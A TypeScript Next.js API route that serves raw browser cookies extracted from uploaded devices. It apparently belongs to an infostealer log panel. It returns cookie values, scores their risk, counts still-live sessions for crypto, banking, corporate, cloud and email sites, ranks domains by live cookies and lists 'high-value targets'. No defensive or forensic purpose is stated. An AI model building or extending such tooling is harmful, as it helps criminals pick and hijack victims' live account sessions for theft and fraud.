import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/db"
import { validateRequest } from "@/lib/auth"

/**
 * Convert Chrome WebKit timestamp to Unix timestamp
 * Chrome uses microseconds since January 1, 1601 (Windows epoch)
 * Unix uses seconds since January 1, 1970
 */
function chromeToUnixTimestamp(chromeTimestamp: number): number {
  if (!chromeTimestamp || chromeTimestamp === 0) return 0
  // 11644473600 = seconds between 1601 and 1970
  // Divide by 1000000 to convert microseconds to seconds
  return (chromeTimestamp - 11644473600000000) / 1000000
}

/**
 * GET /api/v1/cookies/[deviceId]
 *
 * Raw cookies extracted from browsers with risk scoring and categorization
 * Supports filtering by:
 *  - category: ?category=crypto,corporate,banking
 *  - risk: ?risk=critical,high
 *  - status: ?status=live,expired,session
 *  - profile: ?profile=Default,Profile%201
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  try {
    const user = await validateRequest(request)
    if (!user) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      )
    }

    const { deviceId } = params
    const { searchParams } = new URL(request.url)
    const categoryFilter = searchParams.get("category")
    const riskFilter = searchParams.get("risk")
    const statusFilter = searchParams.get("status")
    const profileFilter = searchParams.get("profile")

    // Get device info
    const deviceResults = await executeQuery<any>(
      `SELECT device_id, device_name, upload_date FROM devices WHERE device_id = ? LIMIT 1`,
      [deviceId]
    )

    if (!deviceResults || deviceResults.length === 0) {
      return NextResponse.json(
        { success: false, error: "Device not found" },
        { status: 404 }
      )
    }

    const device = deviceResults[0]

    // Build WHERE clause for filters
    let whereConditions = ["device_id = ?"]
    let queryParams: any[] = [deviceId]

    if (categoryFilter) {
      const categories = categoryFilter.split(",").map(c => c.trim())
      const categoryConditions = categories.map(() => "primary_category = ?")
      whereConditions.push(`(${categoryConditions.join(" OR ")})`)
      queryParams.push(...categories)
    }

    if (riskFilter) {
      const riskLevels = riskFilter.split(",").map(r => r.trim())
      const riskConditions = riskLevels.map(() => "risk_level = ?")
      whereConditions.push(`(${riskConditions.join(" OR ")})`)
      queryParams.push(...riskLevels)
    }

    const whereClause = whereConditions.join(" AND ")

    // Get cookies with all fields
    const cookies = await executeQuery<any>(
      `SELECT
        id,
        host_key,
        name,
        value,
        path,
        expires_utc,
        is_secure,
        is_httponly,
        same_site,
        primary_category,
        categories,
        risk_level,
        risk_score,
        browser,
        profile,
        file_path,
        created_at
       FROM cookies
       WHERE ${whereClause}
       ORDER BY
         CASE risk_level
           WHEN 'critical' THEN 0
           WHEN 'high' THEN 1
           WHEN 'medium' THEN 2
           WHEN 'low' THEN 3
           ELSE 4
         END,
         risk_score DESC,
         host_key,
         name`,
      queryParams
    )

    const now = Date.now()

    // Parse categories JSON and calculate expiration status
    let processedCookies = (cookies || []).map((cookie: any) => {
      const expiresUtc = Number(cookie.expires_utc) || 0
      const isSessionCookie = expiresUtc === 0

      let expiresAt = null
      let isLive = false
      let daysUntilExpiry = null
      let daysSinceExpiry = null

      if (!isSessionCookie) {
        const unixSeconds = chromeToUnixTimestamp(expiresUtc)
        expiresAt = new Date(unixSeconds * 1000)
        isLive = expiresAt > new Date(now)

        const diffMs = expiresAt.getTime() - now
        const diffDays = Math.ceil(diffMs / (1000 * 60 * 60 * 24))

        if (isLive) {
          daysUntilExpiry = diffDays
        } else {
          daysSinceExpiry = Math.abs(diffDays)
        }
      } else {
        // Session cookies are considered "live" until browser closes
        isLive = true
      }

      return {
        ...cookie,
        categories: cookie.categories ? JSON.parse(cookie.categories) : [],
        is_secure: Boolean(cookie.is_secure),
        is_httponly: Boolean(cookie.is_httponly),
        same_site: cookie.same_site,
        is_session_cookie: isSessionCookie,
        is_live: isLive,
        expires_at: expiresAt ? expiresAt.toISOString() : null,
        days_until_expiry: daysUntilExpiry,
        days_since_expiry: daysSinceExpiry
      }
    })

    // Apply status filter (live/expired/session)
    if (statusFilter) {
      const statuses = statusFilter.split(",").map(s => s.trim().toLowerCase())
      processedCookies = processedCookies.filter((cookie: any) => {
        if (statuses.includes('live') && cookie.is_live && !cookie.is_session_cookie) return true
        if (statuses.includes('expired') && !cookie.is_live && !cookie.is_session_cookie) return true
        if (statuses.includes('session') && cookie.is_session_cookie) return true
        return false
      })
    }

    // Apply profile filter
    if (profileFilter) {
      const profiles = profileFilter.split(",").map(p => p.trim())
      processedCookies = processedCookies.filter((cookie: any) =>
        profiles.includes(cookie.profile)
      )
    }

    // Calculate statistics
    const liveCookies = processedCookies.filter((c: any) => c.is_live && !c.is_session_cookie)
    const expiredCookies = processedCookies.filter((c: any) => !c.is_live && !c.is_session_cookie)
    const sessionCookies = processedCookies.filter((c: any) => c.is_session_cookie)

    const stats = {
      total_cookies: processedCookies.length,
      unique_domains: new Set(processedCookies.map((c: any) => c.host_key)).size,
      unique_browsers: new Set(processedCookies.map((c: any) => c.browser).filter(Boolean)).size,
      unique_profiles: new Set(processedCookies.map((c: any) => c.profile).filter(Boolean)).size,
      secure_cookies: processedCookies.filter((c: any) => c.is_secure).length,
      httponly_cookies: processedCookies.filter((c: any) => c.is_httponly).length,

      // Expiration status
      live_cookies: liveCookies.length,
      expired_cookies: expiredCookies.length,
      session_cookies: sessionCookies.length,

      // Risk breakdown
      critical_risk: processedCookies.filter((c: any) => c.risk_level === 'critical').length,
      high_risk: processedCookies.filter((c: any) => c.risk_level === 'high').length,
      medium_risk: processedCookies.filter((c: any) => c.risk_level === 'medium').length,
      low_risk: processedCookies.filter((c: any) => c.risk_level === 'low').length,

      // Category breakdown (total)
      crypto_cookies: processedCookies.filter((c: any) => c.primary_category === 'crypto').length,
      banking_cookies: processedCookies.filter((c: any) => c.primary_category === 'banking').length,
      corporate_cookies: processedCookies.filter((c: any) => c.primary_category === 'corporate').length,
      email_cookies: processedCookies.filter((c: any) => c.primary_category === 'email').length,
      cloud_cookies: processedCookies.filter((c: any) => c.primary_category === 'cloud').length,
      social_cookies: processedCookies.filter((c: any) => c.primary_category === 'social').length,
      ecommerce_cookies: processedCookies.filter((c: any) => c.primary_category === 'ecommerce').length,
      gaming_cookies: processedCookies.filter((c: any) => c.primary_category === 'gaming').length,

      // Category breakdown (live only)
      live_crypto: liveCookies.filter((c: any) => c.primary_category === 'crypto').length,
      live_banking: liveCookies.filter((c: any) => c.primary_category === 'banking').length,
      live_corporate: liveCookies.filter((c: any) => c.primary_category === 'corporate').length,
      live_email: liveCookies.filter((c: any) => c.primary_category === 'email').length,
      live_cloud: liveCookies.filter((c: any) => c.primary_category === 'cloud').length,
      live_social: liveCookies.filter((c: any) => c.primary_category === 'social').length,
      live_ecommerce: liveCookies.filter((c: any) => c.primary_category === 'ecommerce').length,
      live_gaming: liveCookies.filter((c: any) => c.primary_category === 'gaming').length
    }

    // Group cookies by category
    const cookiesByCategory = groupBy(processedCookies, 'primary_category')

    // Group cookies by risk level
    const cookiesByRisk = groupBy(processedCookies, 'risk_level')

    // Group cookies by domain
    const cookiesByDomain = groupBy(processedCookies, 'host_key')

    // Group cookies by browser profile
    const cookiesByProfile = groupBy(
      processedCookies.filter((c: any) => c.profile),
      'profile'
    )

    // Get top domains by cookie count WITH live cookie counts
    const topDomains = Object.entries(cookiesByDomain)
      .map(([domain, cookies]) => {
        const liveCookiesForDomain = cookies.filter((c: any) => c.is_live)
        return {
          domain,
          total_count: cookies.length,
          live_count: liveCookiesForDomain.length,
          expired_count: cookies.filter((c: any) => !c.is_live && !c.is_session_cookie).length,
          session_count: cookies.filter((c: any) => c.is_session_cookie).length,
          primary_category: cookies[0]?.primary_category || 'unknown',
          risk_level: cookies[0]?.risk_level || 'unknown',
          risk_score: Math.max(...cookies.map((c: any) => c.risk_score || 0))
        }
      })
      .sort((a, b) => b.live_count - a.live_count) // Sort by LIVE cookies first
      .slice(0, 50)

    // Browser profiles with live cookie counts
    const profileStats = Object.entries(cookiesByProfile)
      .map(([profile, cookies]) => {
        const liveCookiesForProfile = cookies.filter((c: any) => c.is_live)
        return {
          profile,
          total_count: cookies.length,
          live_count: liveCookiesForProfile.length,
          expired_count: cookies.filter((c: any) => !c.is_live && !c.is_session_cookie).length,
          session_count: cookies.filter((c: any) => c.is_session_cookie).length,
          browsers: Array.from(new Set(cookies.map((c: any) => c.browser).filter(Boolean))),

          // Live cookies by category for this profile
          live_crypto: liveCookiesForProfile.filter((c: any) => c.primary_category === 'crypto').length,
          live_banking: liveCookiesForProfile.filter((c: any) => c.primary_category === 'banking').length,
          live_corporate: liveCookiesForProfile.filter((c: any) => c.primary_category === 'corporate').length
        }
      })
      .sort((a, b) => b.live_count - a.live_count)

    // High-value targets (critical/high risk in important categories)
    const highValueTargets = processedCookies.filter((c: any) =>
      (c.risk_level === 'critical' || c.risk_level === 'high') &&
      ['crypto', 'banking', 'corporate', 'cloud', 'email'].includes(c.primary_category)
    )

    // High-value LIVE targets
    const liveHighValueTargets = liveCookies.filter((c: any) =>
      (c.risk_level === 'critical' || c.risk_level === 'high') &&
      ['crypto', 'banking', 'corporate', 'cloud', 'email'].includes(c.primary_category)
    )

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      device_name: device.device_name,
      upload_date: device.upload_date,
      filters: {
        category: categoryFilter,
        risk: riskFilter,
        status: statusFilter,
        profile: profileFilter
      },
      stats,
      cookies: {
        all: processedCookies,
        by_category: cookiesByCategory,
        by_risk: cookiesByRisk,
        by_domain: cookiesByDomain,
        by_profile: cookiesByProfile,
        top_domains: topDomains,
        profile_stats: profileStats,
        high_value_targets: highValueTargets,
        live_high_value_targets: liveHighValueTargets
      }
    })

  } catch (error: any) {
    console.error("Error fetching cookies:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch cookies",
        details: error.message
      },
      { status: 500 }
    )
  }
}

/**
 * Group array by key
 */
function groupBy(array: any[], key: string): Record<string, any[]> {
  return array.reduce((result, item) => {
    const groupKey = item[key] || 'unknown'
    if (!result[groupKey]) {
      result[groupKey] = []
    }
    result[groupKey].push(item)
    return result
  }, {} as Record<string, any[]>)
}
